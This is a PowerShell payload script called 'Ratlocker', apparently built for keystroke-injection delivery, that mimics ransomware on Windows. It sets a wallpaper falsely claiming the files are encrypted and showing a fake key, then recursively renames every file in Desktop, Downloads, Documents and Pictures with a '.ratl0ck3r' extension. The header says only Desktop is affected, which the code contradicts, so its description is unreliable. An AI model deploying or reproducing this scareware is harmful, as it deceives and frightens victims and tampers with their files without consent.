# Title:          Ratlocker
# Author:         Ratcode404(.github.io)
# Target:         Windows
# Description:    Adds ratcode file extensions, draws and sets background without the use of URLs or image download (avoid proxy blocking and detection). The original wallpaper will be backed up on \pictures\wallpaper.ratl0ck3r, so no files will be lost. The current setup only targets the files and folder structures on $HOME\Desktop\, but it could be easily extended by adjusting the path variable further down.

# Base delay after initiation and PowerShell startup
Start-Sleep -Milliseconds 250
$wshell = New-Object -ComObject WScript.Shell
$wshell.SendKeys("{LWIN}")
Start-Sleep -Milliseconds 100
$wshell.SendKeys("powershell")
$wshell.SendKeys("{ENTER}")
Start-Sleep -Milliseconds 250

# Backup Wallpaper
Copy-Item "$HOME\AppData\Roaming\Microsoft\Windows\Themes\TranscodedWallpaper" -Destination "$HOME\pictures\wallpaper.ratl0ck3r"
Start-Sleep -Milliseconds 250

# Create new wallpaper
Add-Type -AssemblyName System.Drawing
$filename = "$HOME\pictures\ratl0ck3r.png"
$bmp = New-Object System.Drawing.Bitmap 1080,720
$font = New-Object System.Drawing.Font Consolas,10
$brushBg = [System.Drawing.Brushes]::Black
$brushFg = [System.Drawing.Brushes]::Green
$graphics = [System.Drawing.Graphics]::FromImage($bmp)
$graphics.FillRectangle($brushBg,0,0,$bmp.Width,$bmp.Height)
$graphics.DrawString('Your device has been encrypted by ratlocker.
            ____()()
          /      OO
     ~~~~~\_;m__m._>o


Oops! Your files have been encrypted.
Your personal installation key #1:
b0d549572a40f93aa57400dbe43ee72a5e545f47765ef5fb7d17c7e83001cb3d',$font,$brushFg,10,10)
$graphics.Dispose()
$bmp.Save($filename)
Start-Sleep -Milliseconds 500

# Set new wallpaper
$MyWallpaper = "$HOME\pictures\ratl0ck3r.png"
$code = @'
using System.Runtime.InteropServices;

namespace Win32
{
    public class Wallpaper
    {
        [DllImport("user32.dll", CharSet=CharSet.Auto)]
        static extern int SystemParametersInfo (int uAction , int uParam , string lpvParam , int fuWinIni);

        public static void SetWallpaper(string thePath)
        {
            SystemParametersInfo(20, 0, thePath, 3);
        }
    }
}
'@
Add-Type -TypeDefinition $code
[Win32.Wallpaper]::SetWallpaper($MyWallpaper)
Start-Sleep -Milliseconds 500

# Add ratl0ck3r extension
$desktopPath = "$HOME\Desktop"
$downloadsPath = "$HOME\Downloads"
$documentsPath = "$HOME\Documents"
$picturesPath = "$HOME\Pictures"

$shortcutExtensions = @(".lnk", ".url")
$extensionsToAdd = ".ratl0ck3r"

$shortcutItems = Get-ChildItem -Path $desktopPath -Filter "*$shortcutExtensions" -File -Recurse
$shortcutItems | Rename-Item -NewName { $_.Name + $extensionsToAdd }

$items = Get-ChildItem -Path $desktopPath, $downloadsPath, $documentsPath, $picturesPath -File -Recurse
$items | Rename-Item -NewName { $_.Name + $extensionsToAdd }
